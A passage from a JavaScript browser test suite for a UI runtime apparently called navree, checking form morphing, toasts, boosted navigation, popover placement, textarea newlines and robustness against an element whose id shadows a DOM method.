          pending: Element.prototype.hasAttribute.call(Document.prototype.querySelector.call(document, "form"), "data-pending"),
          toast: Document.prototype.querySelector.call(document, "[data-slot=toast]")?.textContent,
        }));
        assert.deepEqual(state, { t: "morphed", pending: false, toast: "done" }, name);
        await page.evaluate(() => Document.prototype.getElementById.call(document, "n").click());
        await sleep(200);
        assert.equal(await page.evaluate(() => !!Document.prototype.getElementById.call(document, "h")), true, `${name}: boosted`);
        assert.equal(hits(`/${path}-next`)[0].headers["x-navree-ui"], "1", `${name}: boosted by the runtime`);
        assert.deepEqual(errors, [], name);
        await context.close();
      }
    });

    test(`an element with the id addEventListener doesn't stop the runtime (${engine})`, async () => {
      const name = key("windowname");
      route(`/${name}`, doc(`<div id="addEventListener"></div><div id="t">start</div><form id="f" data-ui-form method="post" action="/${name}-post"><button id="go">go</button></form>`));
      f.routes.set(`/${name}-post`, (req, res) => f.ops(res, { ops: [{ op: "toast", tone: "info", text: "done" }] }));
      const { context, page, errors } = await fresh(`/${name}`);
      await page.click("#go");
      await sleep(200);
      assert.deepEqual(await toasts(page), ["done"]);
      assert.deepEqual(errors, []);
      await context.close();
    });

    test(`a morph keeps where an open popover was placed (${engine})`, async () => {
      const name = key("placed");
      const body = (n) => `<div id="r" data-ui-src="/${name}-frag"><button id="pop" popovertarget="p">open ${n}</button><div id="p" popover data-ui-place>menu</div></div>`;
      route(`/${name}`, doc(`${body(1)}<form id="f" data-ui-form method="post" action="/${name}-inv"><button id="go">go</button></form>`, { head: `<script type="module" src="/_navree/ui/overlay.js"></script>` }));
      route(`/${name}-frag`, doc(body(2)));
      f.routes.set(`/${name}-inv`, (req, res) => f.ops(res, { ops: [{ op: "invalidate", target: "r" }] }));
      const { context, page } = await fresh(`/${name}`);
      await page.click("#pop");
      await page.waitForFunction(() => document.getElementById("p").style.left !== "");
      const placed = await page.evaluate(() => document.getElementById("p").style.left);
      await page.evaluate(() => document.getElementById("f").requestSubmit());
      await sleep(250);
      assert.equal(await page.textContent("#pop"), "open 2");
      assert.equal(await page.evaluate(() => document.getElementById("p").style.left), placed);
      await context.close();
    });

    test(`a textarea from the server keeps its first newline (${engine})`, async () => {
      const name = key("area");
      route(`/${name}`, doc(`<textarea id="a" name="a">\n\nfirst line</textarea>`));
      const { context, page } = await fresh(`/${name}`);
      assert.equal(await page.inputValue("#a"), "\nfirst line");
      await context.close();
    });
  });
}
